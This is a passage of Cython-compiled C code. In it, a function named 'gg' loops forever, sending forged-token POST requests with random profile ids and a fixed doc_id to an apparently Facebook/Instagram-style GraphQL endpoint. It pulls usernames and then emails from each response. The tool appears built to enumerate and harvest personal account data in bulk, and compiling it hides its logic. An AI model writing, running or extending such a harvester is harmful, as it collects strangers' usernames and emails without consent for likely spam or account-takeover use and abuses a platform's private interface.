        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_15, __pyx_t_16);
        goto __pyx_L31_error;
        __pyx_L38_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_15, __pyx_t_16);
        __pyx_L42_try_end:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L36_try_end;
    __pyx_L31_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_5 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_5) {
      __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 657, __pyx_L33_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __pyx_v_e = __pyx_t_3;
      /*try:*/ {
      }
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L49;
        }
        __pyx_L49:;
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L32_exception_handled;
    }
    goto __pyx_L33_except_error;
    __pyx_L33_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_14);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_14, __pyx_t_7);
    goto __pyx_L1_error;
    __pyx_L32_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_14);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_14, __pyx_t_7);
    __pyx_L36_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_rr);
  __Pyx_XDECREF(__pyx_v_Id);
  __Pyx_XDECREF(__pyx_v_full_name);
  __Pyx_XDECREF(__pyx_v_fows);
  __Pyx_XDECREF(__pyx_v_fowg);
  __Pyx_XDECREF(__pyx_v_pp);
  __Pyx_XDECREF(__pyx_v_isPraise);
  __Pyx_XDECREF(__pyx_v_bio);
  __Pyx_XDECREF(__pyx_v_is_verified);
  __Pyx_XDECREF(__pyx_v_bizz);
  __Pyx_XDECREF(__pyx_v_ss);
  __Pyx_XDECREF(__pyx_v_ff);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_29gg(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_29gg = {"gg", (PyCFunction)__pyx_pw_6source_29gg, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_29gg(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("gg (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_28gg(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_28gg(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_emails = NULL;
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  Py_ssize_t __pyx_t_15;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("gg", 0);

  
  while (1) {

    
    __pyx_t_1 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choices); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_string); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_ascii_letters); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_string); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_k, __pyx_int_32) < 0) __PYX_ERR(0, 664, __pyx_L1_error)
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = PyUnicode_Join(__pyx_kp_u__24, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_lsd, __pyx_t_2) < 0) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_dumps); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_randrange); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_bbk); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_9 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_9)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_9);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_7)) {
      PyObject *__pyx_temp[3] = {__pyx_t_9, __pyx_t_6, __pyx_t_8};
      __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
      PyObject *__pyx_temp[3] = {__pyx_t_9, __pyx_t_6, __pyx_t_8};
      __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    } else
    #endif
    {
      __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 665, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (__pyx_t_9) {
        __Pyx_GIVEREF(__pyx_t_9); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_9); __pyx_t_9 = NULL;
      }
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_t_8);
      __pyx_t_6 = 0;
      __pyx_t_8 = 0;
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_11, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 665, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    }
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_id, __pyx_t_7) < 0) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_render_surface, __pyx_n_u_PROFILE) < 0) __PYX_ERR(0, 665, __pyx_L1_error)
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 665, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_variables, __pyx_t_2) < 0) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_doc_id, __pyx_kp_u_25618261841150840) < 0) __PYX_ERR(0, 664, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_1));
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_4 = __Pyx_PyDict_GetItem(__pyx_v_data, __pyx_n_u_lsd); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_X_FB_LSD, __pyx_t_4) < 0) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_t_5) < 0) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 671, __pyx_L1_error)

    
    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__79, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 669, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_5);
    __pyx_t_5 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_13, &__pyx_t_14);
      __Pyx_XGOTREF(__pyx_t_12);
      __Pyx_XGOTREF(__pyx_t_13);
      __Pyx_XGOTREF(__pyx_t_14);
      /*try:*/ {

        
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_7)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_u_data, __pyx_t_4};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_u_data, __pyx_t_4};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        } else
        #endif
        {
          __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_11);
          if (__pyx_t_3) {
            __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_3); __pyx_t_3 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_n_u_data);
          PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_t_4);
          PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_t_4);
          __pyx_t_4 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_11, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        }
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_11 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_7)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_2};
          __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_2};
          __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        } else
        #endif
        {
          __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_n_u_user);
          PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_t_2);
          PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_t_2);
          __pyx_t_2 = 0;
          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_1, __pyx_n_u_username) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_n_u_username);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 675, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF_SET(__pyx_v_username, __pyx_t_5);
        __pyx_t_5 = 0;

        
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 676, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 676, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 676, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 677, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_2)) {
